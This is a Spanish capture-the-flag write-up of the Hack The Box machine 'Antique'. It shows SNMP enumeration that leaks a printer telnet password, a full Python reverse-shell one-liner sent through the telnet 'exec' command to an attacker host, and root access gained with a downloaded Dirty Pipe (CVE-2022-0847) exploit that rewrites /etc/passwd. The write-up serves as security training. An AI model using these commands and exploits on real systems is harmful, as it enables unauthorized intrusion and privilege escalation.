---
title: Antique WriteUp
date: 2023-04-02
categories: [WriteUps, Máquinas Linux]
tags: [UDP, Telnet, SNMP, CVE]
image:
  path: ../../assets/img/writeups/Antique/antique.jpg
  width: 528
  height: 340
  alt: Banner Antique
---

Escaneando por TCP, como realizo normalmente, encuentro únicamente un puerto abierto, el puerto 23-Telnet. Intento conectarme a él pero me pide contraseña que no sé, en el mensaje de conexión pone "HP Jet Direct" asociado a impresoras. Hago un escaneo esta vez por UDP y euncuentro el puerto 161-SNMP. Uso herramientas como snmp o snmpwalk para interactuar con ese servicio, recibo más información de nuevo "HTB Printer". Tiene pinta hasta ahora que la vulnerabilidad se va a relacionar con las impresoras, así que haciendo una búsqueda en internet tipo `hacking printers snmp` encuentro artículos. Aprendiendo algo de ellos sigo pasos y consigo contraseña para conectarme al Telnet.  
Telnet tiene la opción exec habilitada con la cual conseguiré una reverse shell.

Escalada:

El kernel del sistema objetivo es vulnerable a exploit llamado **dirty pipe** el cual puede sobreescribir datos en archivos arbitrarios de solo lectura. Encuentro un exploit en github del CVE correspondiente que me resulta sencillo de aplicar y listo.


## Reconocimiento

La ip de la máquina Antique es `10.10.11.107`.

Lo primero es comprobar si tengo alcanze a esa máquina:
```
❯ ping -c 1 10.10.11.107

PING 10.10.11.107 (10.10.11.107) 56(84) bytes of data.
64 bytes from 10.10.11.107: icmp_seq=1 ttl=63 time=43.6 ms

--- 10.10.11.107 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 43.617/43.617/43.617/0.000 ms
```

Un paquete transmitido y otro recibido así que tenemos conexión con Antique.

Averiguaré que puertos tienes abiertos con la herramienta nmap:
```
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.107 -oG allPorts

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-31 10:22 CEST
Initiating SYN Stealth Scan at 10:22
Scanning 10.10.11.107 [65535 ports]
Discovered open port 23/tcp on 10.10.11.107
Completed SYN Stealth Scan at 10:22, 12.12s elapsed (65535 total ports)
Nmap scan report for 10.10.11.107
Host is up, received user-set (0.042s latency).
Scanned at 2023-03-31 10:22:15 CEST for 12s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
23/tcp open  telnet  syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.36 seconds
           Raw packets sent: 66615 (2.931MB) | Rcvd: 65552 (2.622MB)
```
Solo está el puerto 23 abierto que corresponde al servicio Telnet. Me conectaré al servicio:
```
❯ telnet 10.10.11.107

Trying 10.10.11.107...
Connected to 10.10.11.107.
Escape character is '^]'.

HP JetDirect

Password: admin
Invalid password
Connection closed by foreign host.
```
Me pide una contraseña y pruebo con "admin", podría probar un ataque de fuerza bruta pero prefiero seguir mirando de momento.  
Me quedo con lo de HP JetDirect, buscando información encuentro que son servidores de impresión que permiten conectar impresoras con otros dispositivos de la red. Quiero saber si hay alguna vulnerabilidad asociada con esto:
```
> searchsploit jetdirect
```

![Searchsploit]({{ 'assets/img/writeups/Antique/searchsploit.png' | relative_url }}){: .center-image }

Como se puede ver en la foto hay unas cuantas. Podría ir probando todas hasta encontrarla pero no me apetece, voy a seguir con el reconocimiento. Esta vez realizaré un escaneo por udp (user datagram protocol). Los puertos pueden estar abiertos por **TCP** o bien por **UDP**. Normalmente no hago escaneos por udp, pero esta vez como solo he encontrado uno y no es precisamente el puerto 80, que suele ser más goloso, si no el 23-telnet...

```
❯ nmap -sU --top-ports 100 -sV 10.10.11.107

Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-31 12:10 CEST
Stats: 0:00:27 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 37.11% done; ETC: 12:11 (0:00:46 remaining)
Nmap scan report for 10.10.11.107
Host is up (0.046s latency).
Not shown: 99 closed udp ports (port-unreach)
PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server (public)
```
Por UDP encuentra el servicio snmp (simple network management protocol) abierto. Este protocolo facilita el intercambio de información realacionada con la administración de los dispositivos de red, como pueden ser routers, impresoras, etc.

Para interactuar con este servicio(SNMP) tienes herramientas tales como `snmpwalk`, `snmpget` y `snmputil`. Usa la que más rabia te de.

## Buscando vulnerabilidades

Usaré snmpwalk. Busco por el internete algún ejemplo de uso, en este [BLOG](https://blog.invgate.com/es/snmpwalk) encuentro un ejemplo para linux.
```
❯ snmpwalk -v1 -c public 10.10.11.107

Created directory: /var/lib/snmp/cert_indexes
iso.3.6.1.2.1 = STRING: "HTB Printer"
```
Me ha creado un directorio, " a ver si me acuerdo luego de borrarlo..". Lo interesante es lo de Printer. Entre esto y el HP jetdirect parece que la vulnerabilidad se va a encontrar en una impresora.  
Busco por google `hacking printers SNMP`, entre los primeros resultados (el primero o el segundo) está en el siguiente [LINK](http://hacking-printers.net/wiki/index.php/SNMP)

```
❯ snmpget -v1 -c public 10.10.11.107 iso.3.6.1.2.1.25.3.2.1.3.1

iso.3.6.1.2.1.25.3.2.1.3.1 = No Such Instance currently exists at this OID
```
De momento me falla. El OID(Object ID) son los números. Probaré a quitar el "iso".
```
❯ snmpget -v1 -c public 10.10.11.107 .3.6.1.2.1.25.3.2.1.3.1

snmp_build: unknown failure
snmpget: Error building ASN.1 representation (Can't build OID for variable)
```
Algo falla en la representación del OID. Informándome un poco descubro que "iso" corresponde al node name, el node code de "iso" es igual a 1. Así que cambiaré iso por el número 1.
```
❯ snmpget -v1 -c public 10.10.11.107 1.3.6.1.2.1.25.3.2.1.3.1

iso.3.6.1.2.1.25.3.2.1.3.1 = No Such Instance currently exists at this OID
```
Nada tampoco..Pongo todo para que no os creáis que vaya a salir siempre a la primera.

Leyendo, ¡IMPORTANTE!, lee de vez en cuando. En la misma página parece ser que explican que ese OID pertenece a un tipo de dispositivo.

![OID]({{ 'assets/img/writeups/Antique/oid.png' | relative_url }}){: .center-image }

El dispositivo, la impresora, es una HP JetDirect, buscando por internet encuentro su OID;  .1.3.6.1.4.1.11.2.3.9.1.1.13.0
```
❯ snmpget -v1 -c public 10.10.11.107  .1.3.6.1.4.1.11.2.3.9.1.1.13.0

iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135
```
¡Bieeeen!!. Tengo números. Me parece hexadecimal, a ver si estoy en lo cierto;
```
❯ echo "50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135" | xxd -ps -r

P@ssw0rd@123!!123q"2Rbs3CSs$4EuWGW(8i	IYaA"1&1A5# 
```
Eso parece una contraseña por lo menos hasta la comilla. ¿Contraseña para qué?. Entiendo que de la impresora. Por telnet me piden una, así que meteré esa, con la "q" al final daba fallo, la quito y pruebo:
```
❯ telnet 10.10.11.107
Trying 10.10.11.107...
Connected to 10.10.11.107.
Escape character is '^]'.

HP JetDirect

Password: P@ssw0rd@123!!123

Please type "?" for HELP
> 
```
Estoy dentro del servicio Telnet, con la opción `?` sabré que comandos puedo usar.
```
> ?

To Change/Configure Parameters Enter:
Parameter-name: value <Carriage Return>

Parameter-name Type of value
ip: IP-address in dotted notation
subnet-mask: address in dotted notation (enter 0 for default)
default-gw: address in dotted notation (enter 0 for default)
syslog-svr: address in dotted notation (enter 0 for default)
idle-timeout: seconds in integers
set-cmnty-name: alpha-numeric string (32 chars max)
host-name: alpha-numeric string (upper case only, 32 chars max)
dhcp-config: 0 to disable, 1 to enable
allow: <ip> [mask] (0 to clear, list to display, 10 max)

addrawport: <TCP port num> (<TCP port num> 3000-9000)
deleterawport: <TCP port num>
listrawport: (No parameter required)

exec: execute system commands (exec id)
exit: quit from telnet session
```
Y ¡¡cuidaditoo|| que encuentro la opción exec para ejecutar comandos.
```
> exec id
uid=7(lp) gid=7(lp) groups=7(lp),19(lpadmin)
```
## Explotación 


Ahora me lanzaré una reverse shell mediante una instrucción en python mientras desde otra consola me pongo en escucha. Desde la típica que hago me daba problemas, así que pruebo esta:
``` 
> exec python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.11",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```
![En-objetivo]({{ 'assets/img/writeups/Antique/enelotrolado.png' | relative_url }}){: .center-image }

Realizo el tratamiento de la tty
```
> script /dev/null -c bash
CTRL + Z
```
Saldrá de la terminal objetivo. Ahora desde la tuya:
```
> stty raw -echo; fg
> reset xterm
```
Recuperamos la terminal. Para saber el tamaño de mi consola hacer comando `stty size`.
```
> export TERM=xterm
> export SHELL=bash
> stty rows 38 columns 184
```
Con esto queda ya terminado el tratamiento de la consola. Podremos hacer `Ctrl+L` para borrar pantalla y `Ctrl+C` sin que nos salga de la terminal.

Leemos la flag de usuario:
```
lp@antique:/home/lp$ cat user.txt

1734d06bd2247fe9a0b********
```

## Escalada de Privilegios

Escribo mis comandos típicos de escalada:

```
> id
uid=7(lp) gid=7(lp) groups=7(lp),19(lpadmin)

> sudo -l       -Pide contraseña que no tengo.

> find / \-perm -4000 2>/dev/null

/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/authbind/helper
/usr/bin/mount
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/at
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/su           -Nada interesante que yo sepa.

> getcap -r / 2>/dev/null

/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/arping = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep

> uname -a 

Linux antique 5.13.0-051300-generic #202106272333 SMP Sun Jun 27 23:36:43 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
```
Paramos aquí. Busco por internet si esta versión de google es vulnerable, y con la búsqueda `linux 5.13.0 exploit` encuentro un nombre que me suena; **dirty pipe**, vulnerabilidad en el kernel de linux desde la versión 5.8 hasta la versión 5.16.11, la cual puede sobreescribir datos en archivos arbitrarios de solo lectura. Corresponde al  CVE-2022-0847, dejo por aquí un enlace; [Exploit-DB](https://www.exploit-db.com/exploits/50808). Al lado del CVE está el EDB-ID, lo busco por ese número con searchsploit y lo descargo:
```
> searchsploit -m 50808
```
Leo un poco y parece que tengo que añadir argumentos de más a la hora de lanzarlo. **No entiendo mucho como funciona así que busco algo más de información para entender**, por google escribo `dirty pipe explained example`. Encuentro un artículo de hackthebox, no es la máquina resuelta, es un artículo donde lo explican y además recomiendan un exploit de un proyecto de github; [GitHub-Exploit](https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit)

Descargo el exploit.c desde la dirección en Raw del código, luego compilo con la herramienta gcc.
```
> wget https://raw.githubusercontent.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/main/exploit.c

> gcc exploit.c -o exploit
```
Ahora toca enviarlo a la máquina objetivo. Desde la máquina objetivo:
```
lp@antique:/tmp$ nc -nlvp 4448 > exploit
```
Y desde mi máquina se lo envio
```
nc 10.10.11.107 4448 < exploit
```
Vuelvo a la máquina objetivo cierro el nc que sigue en escucha y le doy permisos a ese ejecutable recibido y a darle
```
lp@antique:/tmp$ chmod +x exploit

lp@antique:/tmp$ ./exploit
Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "aaron"...
system() function call seems to have failed :(
lp@antique:/tmp$ su root
Password: 
# id
uid=0(root) gid=0(root) groups=0(root)
```
Pues de perlas, ya somos root. El programa se encargó de sobreescribir el /etc/passwd para ponerle a root la contraseña aaron.

Conseguimos la flag de root:
```
# cat /root/root.txt
1f0feca41db57182a3ba*********
```
Una máquina distinta a lo habitual. No estaba acostumbrado a no buscar la vulnerabilidad en una web, casi siempre veo el puerto 80 abierto y en esta ocasión solo estaba el puerto 23 por tcp. Me ha gustado y he aprendido algo.

Un saludo amigxs.



